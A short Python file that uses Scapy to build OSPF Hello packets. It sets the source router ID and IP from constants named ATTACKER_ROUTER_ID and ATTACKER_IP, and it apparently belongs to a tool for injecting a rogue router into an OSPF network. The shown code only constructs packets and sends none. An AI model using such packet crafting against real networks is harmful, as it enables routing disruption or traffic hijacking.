import time
from scapy.all import *
from scapy.contrib.ospf import *

from config import *


def build_ospf_header(msg_type):

    return OSPF_Hdr(
        version=2,
        type=msg_type,
        src=ATTACKER_ROUTER_ID,
        area=AREA_ID,
        authtype=AUTH_TYPE
    )


def build_hello_packet(neighbors=None):

    if neighbors is None:
        neighbors = []

    eth = Ether(dst="01:00:5e:00:00:05")

    ip = IP(
        src=ATTACKER_IP,
        dst=MULTICAST_OSPF,
        ttl=1,
        proto=89,
        tos=0xc0
    )

    ospf = build_ospf_header(1)

    hello = OSPF_Hello(
        mask="255.255.255.0",
        hellointerval=10,
        options=2,
        prio=1,
        deadinterval=40,
        router="0.0.0.0",
        backup="0.0.0.0",
        neighbors=neighbors
    )

    return eth / ip / ospf / hello
